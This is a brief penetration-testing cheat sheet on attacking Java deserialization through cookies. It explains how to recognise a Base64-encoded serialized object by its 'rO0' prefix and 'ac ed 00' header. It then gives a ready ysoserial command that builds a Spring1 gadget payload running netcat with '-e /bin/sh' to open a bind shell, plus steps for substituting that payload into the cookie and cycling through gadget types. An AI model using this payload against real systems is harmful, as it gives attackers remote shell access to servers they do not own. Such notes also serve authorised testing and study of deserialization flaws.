Java Serialized Object:

This exploits the method readObject() on data coming from the user

if cookie value starts with rO0 there is a good chance the cookie is Base64 encoded java serialized object

Send value to Decoded and Base64 decode it. In the Hex view does is start with ac ed 00? If so, good 
indication of a serialized object.


java -jar ysoserial-master-30099844c6-1.jar Spring1 '/usr/bin/nc -l -p 9999 -e /bin/sh' |base64		#(|base64 -w 0 on linux)
	Spring1 is the Gadget type. Maybe possible gadget types. Try all of them.

Copy the Base64 encoded value and replace the cookie value with it.
